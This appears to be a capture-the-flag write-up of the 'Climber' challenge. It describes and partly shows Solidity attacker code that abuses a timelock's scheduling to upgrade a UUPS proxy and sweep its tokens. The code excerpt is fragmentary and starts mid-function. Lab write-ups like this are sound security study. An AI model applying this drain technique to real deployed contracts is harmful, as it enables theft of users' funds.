# 12. Climber

- This challenge featured the UUPS proxy pattern.
- The admin of the proxy was compromised and we were able to get control of it and execute transactions at will.
- We were able to execute a transaction where we execute the `upgradeToAndCall` function on the proxy and change the implementation to our attacking contract. This completely bypasses all of the previous defence mechanisms of the first implementation.
- We were able to drain the contract of itâ€™s tokens.

## Solution

- `ClimberTimelockAttacker.sol` - this contract served as a middleman that was given proposer roles in order to execute the transactions against the `ClimberTimelock` contract

        address payable timelock,
        address[] calldata targets,

        newDataElements[2] = abi.encodeWithSignature(
            "attackOperationSchedule(address,address[],uint256[],bytes[])", timelock, targets, values, dataElements
        );

        ClimberTimelock(timelock).schedule(targets, values, newDataElements, bytes32("grant proposer role"));
    }

    function attackClimberVault(
        address payable timelockAdminContract,
        address attackImplementation,
        address climberVault,
        address recovery,
        address token
    ) public {
        address[] memory targets = new address[](1);
        targets[0] = climberVault;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory dataElements = new bytes[](1);
        dataElements[0] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            attackImplementation,
            abi.encodeWithSignature("sweepDvtTokens(address,address)", recovery, token)
        );

        ClimberTimelock(timelockAdminContract).schedule(targets, values, dataElements, bytes32("sweep tokens"));
        ClimberTimelock(timelockAdminContract).execute(targets, values, dataElements, bytes32("sweep tokens"));
    }
}

```

- `ClimberVaultAttackImplementation.sol` - this was the new attack implementation contract to which we upgraded the proxy to. It has a simple functionality to drain the contract
